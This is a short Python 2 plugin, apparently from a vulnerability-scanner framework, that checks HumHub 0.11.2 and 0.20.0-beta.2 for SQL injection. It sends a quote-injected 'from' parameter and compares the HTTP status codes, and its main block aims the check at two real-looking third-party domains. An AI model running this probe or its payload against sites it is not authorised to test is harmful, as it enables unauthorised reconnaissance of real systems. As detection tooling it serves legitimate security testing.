#!/usr/bin/env python

#name: HumHub 0.11.2 and 0.20.0-beta.2 - SQL Injection
#author: Wd0g
#refer: https://www.exploit-db.com/exploits/38831/
import re

def assign(service, arg):
    if service == "humhub":
        return True, arg

def audit(arg):
    url = arg
    payload1 = 'index.php?r=directory/directory/stream&limit=4&sort=c&from=5&mode=normal'
    payload2 = 'index.php?r=directory/directory/stream&limit=4&sort=c&from=5%27%22&mode=normal'

    code1, head, res1, errcode, _ = curl.curl(url + payload1)
    code2, head, res2, errcode, _ = curl.curl(url + payload2)
    if (code1 == 200 and code2 == 500) and res1 <> res2:
            security_info('GET Injection:'+payload2)

if __name__ == '__main__':
    from dummy import *
    audit(assign('humhub', 'http://www.iocoinhub.io/')[1])
    audit(assign('humhub', 'http://qzcity.me/')[1])